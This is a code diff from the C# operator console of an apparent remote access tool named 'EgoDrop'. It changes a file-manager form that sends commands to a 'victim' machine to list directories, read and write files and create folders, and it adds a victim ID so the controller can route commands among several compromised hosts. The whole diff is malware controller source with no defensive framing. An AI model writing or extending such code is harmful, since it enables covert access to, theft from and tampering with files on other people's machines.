@@ -13,6 +13,7 @@ namespace EgoDrop
     public partial class frmFileMgr : Form
     {
         public clsVictim m_victim { get; set; }
+        public string m_szVictimID { get; init; }
 
         private string m_szInitDir { get; set; }
         private string m_szCurrentPath { get { return (string)textBox1.Tag; } }
@@ -65,10 +66,11 @@ namespace EgoDrop
             }
         }
 
-        public frmFileMgr(clsVictim victim)
+        public frmFileMgr(string szVictimID, clsVictim victim)
         {
             InitializeComponent();
 
+            m_szVictimID = szVictimID;
             m_victim = victim;
             m_szInitDir = string.Empty;
         }
@@ -79,9 +81,9 @@ namespace EgoDrop
         /// <param name="listener">Listener object.</param>
         /// <param name="victim">Victim object.</param>
         /// <param name="lsMsg">Message list.</param>
-        private void fnRecvMsg(clsListener listener, clsVictim victim, List<string> lsMsg)
+        private void fnRecvMsg(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
-            if (!clsTools.fnbSameVictim(victim, m_victim))
+            if (!string.Equals(szSrcVictimID, m_szVictimID) || !clsTools.fnbSameVictim(victim, m_victim))
                 return;
 
             Invoke(new Action(() =>
@@ -346,7 +348,7 @@ namespace EgoDrop
 
         public void fnWriteFile(string szFilePath, string szContent)
         {
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "file",
                 "wf",
@@ -357,7 +359,7 @@ namespace EgoDrop
 
         public void fnReadFile(string szFilePath)
         {
-            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim);
+            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim, m_szVictimID);
             if (f == null)
             {
                 f = new frmFileEditor(m_victim);
@@ -368,7 +370,7 @@ namespace EgoDrop
                 f.BringToFront();
             }
 
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "file",
                 "rf",
@@ -378,7 +380,7 @@ namespace EgoDrop
 
         public void fnGoto(string szDirPath)
         {
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "file",
                 "goto",
@@ -388,7 +390,7 @@ namespace EgoDrop
 
         private void fnSetup()
         {
-            m_victim.fnSendCommand("file|init");
+            m_victim.fnSendCommand(m_szVictimID, "file|init");
             m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
         }
 
@@ -405,7 +407,7 @@ namespace EgoDrop
         private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
         {
             string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
-            m_victim.fnSendCommand("file|sd|" + szPath);
+            m_victim.fnSendCommand(m_szVictimID, "file|sd|" + szPath);
         }
 
         private void listView1_DoubleClick(object sender, EventArgs e)
@@ -443,7 +445,7 @@ namespace EgoDrop
                 .Select(x => x.szFilePath)
                 .ToList();
 
-            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
             if (f == null)
             {
                 f = new frmFileImage(m_victim);
@@ -465,7 +467,7 @@ namespace EgoDrop
                 .Select(x => x.szFilePath)
                 .ToList();
 
-            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
+            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
             if (f == null)
             {
                 f = new frmFileImage(m_victim);
@@ -509,7 +511,7 @@ namespace EgoDrop
                 return;
             }
 
-            m_victim.fnSendCommand(new string[]
+            m_victim.fnSendCommand(m_szVictimID, new string[]
             {
                 "file",
                 "nd",
